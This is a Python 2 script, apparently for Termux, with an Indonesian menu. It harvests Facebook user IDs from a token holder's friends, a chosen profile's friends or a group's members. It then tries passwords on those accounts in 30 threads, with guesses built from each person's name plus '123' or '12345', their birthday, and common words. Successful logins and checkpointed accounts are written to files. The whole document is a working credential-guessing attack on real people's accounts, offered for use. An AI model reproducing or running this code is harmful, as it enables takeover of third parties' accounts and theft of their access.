# -*- coding: utf-8 -*-
import sys
from login import logo
sys.path.insert (0, "..")
from warna import *


berhasil = []
checkpoint = []
id = []
def acak():
	global id
	logo()
	toket = open ("Token.txt", "r").read()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Hack Id Teman"
	print u +"║"+ k +"02"+ u +"║"+ k +" Hack Id Temannya Dari Teman"
	print u +"║"+ m +"03"+ u +"║"+ m +" Hack Id Anggota Grub"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irull = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	logo()
	if irull == "01" or irull == "1":
		jl = json.loads (get ("https://graph.facebook.com/me/friends?access_token="+ toket).text)
		for i in jl["data"]:
			id.append (i["id"])
		irul()
	elif irull == "02" or irull == "2":
		idd = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
		try:
			name = json.loads (get ("https://graph.facebook.com/"+ idd +"?access_token="+ toket).text)
			print h +"✔ Id Temannya Dari "+ name["name"]
			jl = json.loads (get ("https://graph.facebook.com/"+ idd +"/friends?access_token="+ toket).text)
			for i in jl["data"]:
				id.append (i["id"])
			irul()
		except KeyError:
			print m + tebal +"✘ Id Profil Tidak Ditemukan"+ n
			sleep (3)
			acak()
	elif irull == "03" or irull == "3":
		idd = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
		try:
			name = json.loads (get ("https://graph.facebook.com/group/?id="+ idd +"&access_token="+ toket).text)
			print h +"✔ Id Anggota Grup "+ name["name"]
			jl = json.loads (get ("https://graph.facebook.com/"+ idd +"/members?fields=name,id&limit=999999999&access_token="+ toket).text)
			for i in jl["data"]:
				id.append (i["id"])
			irul()
		except KeyError:
			print m + tebal +"✘ Id Grub Tidak Ditemukan"+ n
			sleep (3)
			acak()
	elif irull == "09" or irull == "9":
		system ("exit")
	else:
		salah()
		acak()


def irul():
	print u +"\r•"+ k +" Jumlah Id "+ n +": "+ h + str(len(id))
	print u + 53 * "═"
	
	
	def main(arg):
		global berhasil, checkpoint
		toket = open ("Token.txt", "r").read()
		user = arg
		try:
			katasandi = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ toket).text)
			
			
			pass1 = katasandi["first_name"] +"123"
			at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass1) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
			if "access_token" in at:
				nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
				print h +"✔ "+ user + u +" | "+ h + pass1 + u +" => "+ n + nama["name"]
				kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
				kec.write (user +" | "+ pass1 +" => "+ nama["name"] +"\n")
				kec.close ()
				berhasil.append (user+pass1)
			elif "www.facebook.com" in at["error_msg"]:
				print k +"✔ "+ user + u +" | "+ k + pass1
				cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
				cek.write (user +" | "+ pass1 +"\n")
				cek.close ()
				checkpoint.append (user+pass1)
			else:
				pass2 = katasandi["first_name"] +"12345"
				at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass2) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
				if "access_token" in at:
					nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
					print h +"✔ "+ user + u +" | "+ h + pass2 + u +" => "+ n + nama["name"]
					kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
					kec.write (user +" | "+ pass2 +" => "+ nama["name"] +"\n")
					kec.close ()
					berhasil.append (user+pass2)
				elif "www.facebook.com" in at["error_msg"]:
					print k +"✔ "+ user + u +" | "+ k + pass2
					cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
					cek.write (user +" | "+ pass2 +"\n")
					cek.close ()
					checkpoint.append (user+pass2)
				else:
					pass3 = katasandi["middle_name"] +"123"
					at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass3) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
					if "access_token" in at:
						nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
						print h +"✔ "+ user + u +" | "+ h + pass3 + u +" => "+ n + nama["name"]
						kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
						kec.write (user +" | "+ pass3 +" => "+ nama["name"] +"\n")
						kec.close ()
						berhasil.append (user+pass3)
					elif "www.facebook.com" in at["error_msg"]:
						print k +"✔ "+ user + u +" | "+ k + pass3
						cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
						cek.write (user +" | "+ pass3 +"\n")
						cek.close ()
						checkpoint.append (user+pass3)
					else:
						pass4 = katasandi["middle_name"] +"12345"
						at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass4) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
						if "access_token" in at:
							nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
							print h +"✔ "+ user + u +" | "+ h + pass4 + u +" => "+ n + nama["name"]
							kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
							kec.write (user +" | "+ pass4 +" => "+ nama["name"] +"\n")
							kec.close ()
							berhasil.append (user+pass4)
						elif "www.facebook.com" in at["error_msg"]:
							print k +"✔ "+ user + u +" | "+ k + pass4
							cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
							cek.write (user +" | "+ pass4 +"\n")
							cek.close ()
							checkpoint.append (user+pass4)
						else:
							pass5 = katasandi["last_name"] +"123"
							at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass5) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
							if "access_token" in at:
								nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
								print h +"✔ "+ user + u +" | "+ h + pass5 + u +" => "+ n + nama["name"]
								kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
								kec.write (user +" | "+ pass5 +" => "+ nama["name"] +"\n")
								kec.close ()
								berhasil.append (user+pass5)
							elif "www.facebook.com" in at["error_msg"]:
								print k +"✔ "+ user + u +" | "+ k + pass5
								cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
								cek.write (user +" | "+ pass5 +"\n")
								cek.close ()
								checkpoint.append (user+pass5)
							else:
								pass6 = katasandi["last_name"] +"12345"
								at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass6) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
								if "access_token" in at:
									nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
									print h +"✔ "+ user + u +" | "+ h + pass6 + u +" => "+ n + nama["name"]
									kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
									kec.write (user +" | "+ pass6 +" => "+ nama["name"] +"\n")
									kec.close ()
									berhasil.append (user+pass6)
								elif "www.facebook.com" in at["error_msg"]:
									print k +"✔ "+ user + u +" | "+ k + pass6
									cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
									cek.write (user +" | "+ pass6 +"\n")
									cek.close ()
									checkpoint.append (user+pass6)
								else:
									lahir = katasandi["birthday"]
									pass7 = lahir.replace ("/", "")
									at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass7) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
									if "access_token" in at:
										nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
										print h +"✔ "+ user + u +" | "+ h + pass7 + u +" => "+ n + nama["name"]
										kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
										kec.write (user +" | "+ pass7 +" => "+ nama["name"] +"\n")
										kec.close ()
										berhasil.append (user+pass7)
									elif "www.facebook.com" in at["error_msg"]:
										print k +"✔ "+ user + u +" | "+ k + pass7
										cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
										cek.write (user +" | "+ pass7 +"\n")
										cek.close ()
										checkpoint.append (user+pass7)
									else:
										pass8 = "sayang"
										at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass8) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
										if "access_token" in at:
											nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
											print h +"✔ "+ user + u +" | "+ h + pass8 + u +" => "+ n + nama["name"]
											kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
											kec.write (user +" | "+ pass8 +" => "+ nama["name"] +"\n")
											kec.close ()
											berhasil.append (user+pass8)
										elif "www.facebook.com" in at["error_msg"]:
											print k +"✔ "+ user + u +" | "+ k + pass8
											cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
											cek.write (user +" | "+ pass8 +"\n")
											cek.close ()
											checkpoint.append (user+pass8)
										else:
											pass9 = "sayang123"
											at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass9) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
											if "access_token" in at:
												nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
												print h +"✔ "+ user + u +" | "+ h + pass9 + u +" => "+ n + nama["name"]
												kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
												kec.write (user +" | "+ pass9 +" => "+ nama["name"] +"\n")
												kec.close ()
												berhasil.append (user+pass9)
											elif "www.facebook.com" in at["error_msg"]:
												print k +"✔ "+ user + u +" | "+ k + pass9
												cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
												cek.write (user +" | "+ pass9 +"\n")
												cek.close ()
												checkpoint.append (user+pass9)
											else:
												pass10 = "anjing"
												at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass10) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
												if "access_token" in at:
													nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
													print h +"✔ "+ user + u +" | "+ h + pass10 + u +" => "+ n + nama["name"]
													kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
													kec.write (user +" | "+ pass10 +" => "+ nama["name"] +"\n")
													kec.close ()
													berhasil.append (user+pass10)
												elif "www.facebook.com" in at["error_msg"]:
													print k +"✔ "+ user + u +" | "+ k + pass10
													cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
													cek.write (user +" | "+ pass10 +"\n")
													cek.close ()
													checkpoint.append (user+pass10)
												else:
													pass11 = "anjing123"
													at = json.load (urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass11) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"))
													if "access_token" in at:
														nama = json.loads (get ("https://graph.facebook.com/"+ user +"?access_token="+ at["access_token"]).text)
														print h +"✔ "+ user + u +" | "+ h + pass11 + u +" => "+ n + nama["name"]
														kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
														kec.write (user +" | "+ pass11 +" => "+ nama["name"] +"\n")
														kec.close ()
														berhasil.append (user+pass11)
													elif "www.facebook.com" in at["error_msg"]:
														print k +"✔ "+ user + u +" | "+ k + pass11
														cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
														cek.write (user +" | "+ pass11 +"\n")
														cek.close ()
														checkpoint.append (user+pass11)
		
		
		except:
			pass
	
	
	t = ThreadPool(30)
	t.map(main, id)
	print u + 53 * "═"
	print u +"• "+ k +"Jumlah"+ h +" Berhasil "+ n +"&"+ k +" Checkpoint "+ n +": "+ h + tebal + str(len(berhasil)) + n +" & "+ k + tebal + str(len(checkpoint)) + n
	print h +"✔ "+ b +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Berhasil.txt"+ n +" Dan "+ k + tebal +"Checkpoint.txt"+ n
	enter()


acak()